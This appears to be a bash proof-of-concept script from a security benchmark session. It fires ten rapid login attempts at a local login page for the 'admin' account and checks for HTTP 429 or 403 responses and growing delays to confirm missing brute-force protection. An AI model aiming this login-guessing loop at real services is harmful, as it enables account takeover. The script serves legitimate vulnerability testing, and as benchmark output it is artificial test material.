#!/bin/bash
# POC: Demonstrates brute force vulnerability by making rapid sequential login attempts without encountering rate limiting, account lockout, or delays. Verifies all attempts complete successfully with HTTP 200 responses.
# Target: ./repo
# Created: 2025-11-04T19:39:26.312Z
# Session: benchmark-XBEN-024-24-mhkyvn4q

# Brute Force Vulnerability POC - No Rate Limiting
# This script demonstrates the vulnerability by making rapid sequential login attempts
# and verifying that no rate limiting, account lockout, or delays are implemented

TARGET_URL="http://localhost:5000/login"
USERNAME="admin"
ATTEMPT_COUNT=10
RESPONSES=()
TIMES=()

echo "=========================================="
echo "Brute Force Vulnerability POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo "Username: $USERNAME"
echo "Number of attempts: $ATTEMPT_COUNT"
echo ""

# Test for rate limiting by making rapid sequential requests
for i in $(seq 1 $ATTEMPT_COUNT); do
    PASSWORD="password_attempt_$i"
    
    # Record start time
    START_TIME=$(date +%s%N)
    
    # Make login attempt
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -d "username=$USERNAME&password=$PASSWORD" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    # Record end time
    END_TIME=$(date +%s%N)
    ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
    
    # Extract HTTP status code
    HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
    RESPONSE_BODY=$(echo "$RESPONSE" | head -n -1)
    
    RESPONSES+=("$HTTP_CODE")
    TIMES+=("$ELAPSED_MS")
    
    echo "Attempt $i: HTTP $HTTP_CODE | Response time: ${ELAPSED_MS}ms"
done

echo ""
echo "=========================================="
echo "ANALYSIS"
echo "=========================================="

# Check for rate limiting indicators
RATE_LIMITED=false
ACCOUNT_LOCKED=false
UNIFORM_RESPONSES=true
INCONSISTENT_TIMES=false

# Check if all responses are HTTP 200
for code in "${RESPONSES[@]}"; do
    if [[ "$code" != "200" ]]; then
        if [[ "$code" == "429" ]]; then
            RATE_LIMITED=true
        fi
        if [[ "$code" == "403" ]]; then
            ACCOUNT_LOCKED=true
        fi
        UNIFORM_RESPONSES=false
    fi
done

# Check if response times are increasing (indicating delays/backoff)
for i in $(seq 0 $((ATTEMPT_COUNT-2))); do
    if [[ ${TIMES[$i]} -lt ${TIMES[$((i+1))]} ]]; then
        INCONSISTENT_TIMES=true
        break
    fi
done

echo "All responses HTTP 200: $UNIFORM_RESPONSES"
echo "Rate limiting detected (429): $RATE_LIMITED"
echo "Account lockout detected (403): $ACCOUNT_LOCKED"
echo "Progressive delays detected: $INCONSISTENT_TIMES"
echo ""

if [[ "$RATE_LIMITED" == "false" && "$ACCOUNT_LOCKED" == "false" && "$UNIFORM_RESPONSES" == "true" ]]; then
    echo "✓ VULNERABILITY CONFIRMED"
    echo "✓ Brute force attacks are possible - no rate limiting or account lockout detected"
    echo "✓ All $ATTEMPT_COUNT attempts succeeded with identical response codes"
    echo "✓ No delays or throttling observed between requests"
    exit 0
else
    echo "✗ VULNERABILITY NOT CONFIRMED"
    echo "✗ Some rate limiting or account lockout protection appears to be in place"
    exit 1
fi